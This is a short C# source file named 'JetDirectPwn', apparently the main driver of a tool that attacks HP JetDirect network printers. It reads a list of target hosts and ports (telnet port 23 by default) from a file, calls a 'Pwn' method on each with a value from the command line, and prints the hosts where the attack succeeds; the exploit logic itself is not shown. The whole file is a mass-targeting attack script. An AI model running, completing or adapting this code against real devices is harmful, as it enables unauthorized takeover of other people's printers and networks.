using System;
using System.IO;

namespace JetDirectPwn
{
    class MainClass
    {
        public static void Main(string[] args)
        {
            string[] targets = File.ReadAllLines(args[0]);

            foreach (string target in targets)
            {
                string[] parts = target.Split(' ');
                int port = parts.Length == 1 ? 23 : Convert.ToInt32(parts[1]);
                JetDirectConnection conn = new JetDirectConnection(parts[0], port);

                if (conn.Pwn(args[1]))
                    Console.WriteLine("{0} {1} {2}", parts[0], port, args[1]);
            }
        }
    }
}
